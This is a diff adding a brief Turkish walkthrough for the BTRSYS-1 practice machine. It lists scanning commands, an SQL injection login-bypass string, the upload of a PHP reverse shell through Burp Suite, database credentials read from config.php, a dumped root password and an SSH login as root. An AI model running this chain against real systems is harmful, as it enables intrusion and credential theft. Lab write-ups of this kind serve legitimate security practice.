@@ -1,0 +1,15 @@
+BTRSYS-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.134 bulundu.
+2 - nmap -sT -A 192.168.2.134
+3 - gobuster dir -u http://192.168.2.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - nikto -h 192.168.2.134
+5 - http://192.168.2.134/login.php, a' or 1=1-- -@btrisk.com : abcd
+6 - cp /usr/share/webshells/php/php-reverse-shell.php .
+7 - cp php-reverse-shell.php php-reverse-shell.jpg
+8 - Burp Suite -> Upload -> php-reverse-shell.php
+9 - http://192.168.2.134/uploads/
+10 - cd /var/www/html, cat config.php, mysqli_connect("localhost","root","toor","deneme");
+11 - mysql -u root -D deneme -p (root:toor)
+12 - show tables;
+13 - select * from user;     root:asd123***
+14 - ssh root@192.168.2.134
